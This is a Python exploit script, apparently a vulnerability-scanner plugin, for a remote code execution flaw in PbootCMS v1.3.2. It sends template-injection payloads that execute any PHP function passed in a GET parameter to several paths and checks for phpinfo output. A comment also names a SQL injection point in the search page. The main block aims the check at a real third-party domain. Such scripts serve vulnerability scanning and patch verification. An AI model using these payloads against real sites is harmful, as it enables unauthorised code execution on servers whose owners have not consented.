#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


'''
PbootCMS v1.3.2命令执行

另外还有 注入： PbootCMS/index.php/Search/index?keyword=pboot&you=gay  注入点在you，搜索型注入
'''

def info(data=None):
    info = {
        "name": "pbootcms_1.3.2_rce",
        "info": "pbootcms_1.3.2_rce",
        "level": "high",
        "type": "rce",
    }
    return info


def prove(data):
    data = init(data, 'pbootcms')
    if data['base_url']:
        for path in ["","PbootCMS/"]:
            for poc in [
                "index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                "index.php/Content/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                "index.php/List/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                "index.php/About/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                "index.php/Search/index?keyword={pboot:if(1)$a=$_GET[title];$a();//)})}}{/pboot:if}&title=phpinfo"
            ]:
                try:
                    url = data['base_url'] + path + poc
                    res = curl('get',url)
                except:
                    res = None
                if res !=None and  "php.ini" in res.text:
                    data['flag'] = 1
                    data['data'].append({"flag": url})
                    data['res'].append({"info": url, "key": "pbootcms v1.3.2 rec"})
                    break
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))